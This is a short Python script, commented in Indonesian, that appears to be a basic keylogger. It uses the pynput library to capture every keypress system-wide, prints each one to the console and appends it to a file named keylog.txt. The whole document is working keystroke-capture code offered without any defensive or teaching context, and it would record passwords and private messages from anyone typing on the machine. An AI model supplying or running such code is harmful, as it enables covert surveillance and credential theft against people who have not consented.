from pynput import keyboard

def on_press(key):
    try:
        print(f"Key {key.char} pressed")
        with open("keylog.txt", "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        print(f"Special key {key} pressed")
        with open("keylog.txt", "a") as file:
            file.write(f"{key} ")

# Listener untuk menangkap input keyboard
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
